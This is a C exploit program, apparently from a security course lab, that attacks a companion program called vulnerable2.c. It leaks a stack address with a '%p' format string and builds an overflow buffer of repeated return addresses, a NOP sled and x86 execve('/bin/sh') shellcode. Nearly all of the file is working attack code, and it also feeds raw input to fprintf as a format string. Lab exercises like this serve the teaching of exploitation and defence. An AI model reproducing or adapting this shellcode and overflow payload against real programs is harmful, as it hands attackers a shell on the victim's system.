/* exploit2.c  */

/* Interacts with vulnerable2.c for code injection. */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define BUFFER_SIZE 512

char shellcode[]=
  "\x31\xc0"             /* xorl    %eax,%eax         */
  "\x50"                 /* pushl   %eax              */
  "\x68""//sh"           /* pushl   $0x68732f2f       */
  "\x68""/bin"           /* pushl   $0x6e69622f       */
  "\x89\xe3"             /* movl    %esp,%ebx         */
  "\x50"                 /* pushl   %eax              */
  "\x53"                 /* pushl   %ebx              */
  "\x89\xe1"             /* movl    %esp,%ecx         */
  "\x99"                 /* cdq                       */
  "\xb0\x3b"             /* movb    $0x3b,%al         */
  "\x2c\x30"             /* sub     $0x30,%al         */
  "\xcd\x80";            /* int     $0x80             */

int main()
{
    char age[] = "%p";

    char age_response[BUFFER_SIZE];

    char buffer[BUFFER_SIZE];

    char *ptr;
    unsigned long *addr_ptr;
    unsigned long addr = 0;

    int i = 0;

    printf("%s\n", age);
    fflush(stdout);

    scanf("%s", age_response);

    fprintf(stderr, "All writes to stdout are getting picked up\n");
    fprintf(stderr, "by the vulnerable2 program; you can print\n");
    fprintf(stderr, "to stderr for debugging, if you want.\n");

    /* TODO: Process the age response */

    fprintf(stderr, age_response);
    addr = strtoul(age_response, NULL, 16);
    addr += 350;

    //padding
    /*for(i = 0; i < 84; i++){
      buffer[i] = '\x51';
    }*/


    //return address:
    ptr = buffer;
    

    addr_ptr = (unsigned long*) ptr;
    for (i=0; i<200; i+=4){
      *(addr_ptr++) = addr;
    }

    /*for (i=0; i<100;i++){
      buffer[i]= '\x52';
    }*/
    
  
    /*buffer[84]='\x52';
    buffer[85]='\x52';
    buffer[86]='\x52';
    buffer[87]='\x52';*/

    //nop
    for (i = 0 ; i < 386; i++){
      buffer[i+100] = '\x90';
    }


    //shellcode
    for (i=0; i<strlen(shellcode); i++){
      buffer[486+i] = shellcode[i];
    }

    /* Print out the contents of the attack buffer */
    printf("%s\n", buffer);

    return 0;
}
